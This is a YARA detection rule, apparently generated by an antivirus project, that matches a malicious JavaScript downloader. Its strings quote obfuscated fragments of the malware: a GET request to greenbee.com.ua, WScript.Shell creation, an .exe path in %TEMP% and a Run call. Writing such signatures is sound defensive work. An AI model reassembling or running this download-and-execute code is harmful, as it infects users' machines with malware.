rule sig_20160330_f1478ffe46b5758a3b80b6ada868104b {
  meta:
    description = "datamaliciousorder - file 20160330_f1478ffe46b5758a3b80b6ada868104b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "bc4b1f0c0c11ed8186a13a1310bfc293dbdad0276a5e2fcf9496a232600b18a0"

  strings:
    $s1  = "BV[CL](\"GET\", \"http://greenbee.com.ua/b7eosa\", false);" fullword ascii
    $s2  = "function SS(R, P0){NA = NA * 1; return R - P0;};" fullword ascii
    $s3  = "var VJ = function G() {return WScript[I](\"WScript\"+\".Shell\");}(), RZ = 11;" fullword ascii
    $s4  = "if (BV[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function P(){return Y + \"\";};" fullword ascii
    $s6  = "function NN() {return VJ[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"AOJFub27ba4.ex\" + \"e\";};" fullword ascii
    $s7  = "function X(E){VJ[\"Run\"](E, NA, NA);};" fullword ascii
    $s8  = "function A() {return ((JM == true) && (JM == F0)) ? 1 : NA;};" fullword ascii
    $s9  = "function Z(){return 22;};" fullword ascii
    $s10 = "var OH = new this[\"Date\"]();" fullword ascii
    $s11 = "}while (G0);" fullword ascii
    $s12 = "function RP()" fullword ascii
    $s13 = "function T(){return I;};" fullword ascii
    $s14 = "function SD(J) {var C = (1, 2, 3, 4, 5, J); return C;};" fullword ascii
    $s15 = "return SS(VW, FV);" fullword ascii
    $s16 = "var F0 = false;" fullword ascii
    $s17 = "var C0 = false;" fullword ascii
    $s18 = "JM = true; " fullword ascii
    $s19 = "F0 = true; " fullword ascii
    $s20 = "var JM = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}